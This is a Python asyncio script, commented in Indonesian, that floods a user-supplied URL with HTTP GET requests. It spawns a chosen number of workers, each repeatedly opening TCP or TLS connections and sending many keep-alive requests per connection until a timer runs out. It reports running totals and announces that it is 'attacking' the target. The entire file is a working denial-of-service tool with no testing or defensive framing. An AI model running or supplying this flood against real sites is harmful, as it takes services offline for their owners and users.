import asyncio
from urllib.parse import urlparse
import sys

# Statistik global untuk memantau performa
requests_sent = 0
connections_made = 0

async def worker(host, port, ssl, payload, rpc):
    global requests_sent, connections_made
    
    while True:
        try:
            # Membuka koneksi TCP ke target
            reader, writer = await asyncio.open_connection(host, port, ssl=ssl)
            connections_made += 1
            
            # Mengirim payload sebanyak nilai RPC (Requests Per Connection)
            for _ in range(rpc):
                writer.write(payload)
                await writer.drain()
                requests_sent += 1
                
        except Exception:
            # Jika koneksi putus atau ditolak, abaikan dan coba lagi
            await asyncio.sleep(0.1)

async def monitor(timer):
    global requests_sent, connections_made
    
    print("\n[+] Pemantauan dimulai...")
    for remaining in range(timer, 0, -1):
        await asyncio.sleep(1)
        # Menampilkan jumlah total request dan koneksi saat ini
        print(f"Sisa Waktu: {remaining}s | Total Koneksi: {connections_made:,} | Total Request: {requests_sent:,}")
    
    print("\n[+] Waktu habis. Selesai.")

async def main():
    # Validasi argumen input
    if len(sys.argv) < 5:
        print(f"Cara penggunaan: python {sys.argv[0]} <URL> <WORKERS> <RPC> <TIMER>")
        return

    # Membaca input dari terminal
    target_url = sys.argv[1]
    total_workers = int(sys.argv[2])
    rpc = int(sys.argv[3])
    timer = int(sys.argv[4])

    # Membedah URL target
    parsed = urlparse(target_url)
    host = parsed.hostname
    is_ssl = parsed.scheme == "https"
    port = parsed.port or (443 if is_ssl else 80)
    path = parsed.path or "/"
    if parsed.query:
        path += f"?{parsed.query}"

    # Membuat template HTTP Request standar
    payload = (
        f"GET {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        "Connection: keep-alive\r\n"
        "\r\n"
    ).encode()

    print(f"Menyerang Target: {host}:{port} menggunakan {total_workers} workers.")

    # Membuat daftar tugas (tasks) untuk semua worker
    tasks = []
    for _ in range(total_workers):
        tasks.append(asyncio.create_task(worker(host, port, is_ssl, payload, rpc)))

    # Menjalankan fungsi pemantau waktu
    await monitor(timer)

if __name__ == "__main__":
    asyncio.run(main())
